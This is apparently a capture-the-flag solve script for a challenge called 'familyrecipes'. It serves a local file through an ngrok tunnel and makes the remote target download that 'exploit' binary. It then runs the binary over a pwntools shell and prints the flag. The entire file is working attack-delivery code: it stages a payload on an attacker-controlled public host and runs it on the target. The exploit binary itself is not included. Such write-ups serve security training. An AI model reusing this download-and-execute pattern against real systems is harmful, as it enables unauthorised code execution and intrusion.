from pyngrok import ngrok
from pwn import *
import time
import http.server
import socketserver
import logging
import os
logging.disable()
ngrok.set_auth_token('')

KEEP = True

HOST = os.environ.get("HOST", "familyrecipes.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 15011))


class QuietHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass


class FileServer(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        httpd = socketserver.TCPServer(("", 0), QuietHandler)
        self.PORT = httpd.server_address[1]
        while KEEP:
            httpd.handle_request()


thread = FileServer()
thread.start()
time.sleep(5)
KEEP = False
LOCAL_PORT = thread.PORT
http_tunnel = ngrok.connect(LOCAL_PORT, 'http')
NGROK_HOST = http_tunnel.public_url
time.sleep(5)

io = remote(HOST, PORT)
io.recvuntil(b": ")

# Send exploit URL
URL = f"{NGROK_HOST}/exploit"
io.sendline(URL.encode())
time.sleep(10)
io.recvuntil(b"$")

ngrok.disconnect(NGROK_HOST)


# Execute exploit and print flag
io.sendline(b"./exploit")
io.recvuntil(b"flag:")
print(io.recvuntil(b"}").decode().strip())
io.close()
